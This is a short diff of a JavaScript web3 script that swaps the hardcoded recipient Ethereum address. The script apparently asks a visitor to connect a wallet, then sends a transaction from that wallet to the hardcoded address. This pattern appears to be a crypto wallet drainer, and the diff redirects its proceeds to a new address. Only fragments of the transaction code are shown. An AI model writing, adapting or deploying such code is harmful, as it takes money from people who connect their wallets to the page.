@@ -1,5 +1,5 @@
 
-const YOUR_WALLET_ADDRESS ="0x71399E855e5461C0E8B66c2D6C3a3b5f8d1B3d02"; // Replace with your wallet address
+const YOUR_WALLET_ADDRESS ="0x32E4Eca86623A2E00c521B244F2b70caC826E502"; // Replace with your wallet address
 
 async function callconnectWallet() { // Renamed to match onclick event
   if (window.ethereum) {
@@ -40,4 +40,5 @@ async function sendWallet(web3, userAddress) {
       if (error) {
         console.error("Transaction failed:", error);} else {
         console.log("Transaction sent:", txHash);}    });} catch (error) {
+
     console.error("Failed:", error);}}
